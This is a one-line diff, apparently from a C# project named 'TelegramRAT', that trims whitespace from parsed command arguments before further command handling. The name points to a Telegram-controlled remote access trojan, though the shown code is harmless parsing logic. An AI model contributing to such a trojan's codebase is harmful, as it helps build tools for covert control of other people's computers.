@@ -28,6 +28,7 @@ namespace TelegramRAT
             
             
             string rawArgs = text.Substring(command.Length);
+            rawArgs = rawArgs.Trim();
             string[] args = ParseArgs(rawArgs);
 
             if (command.Contains('@'))
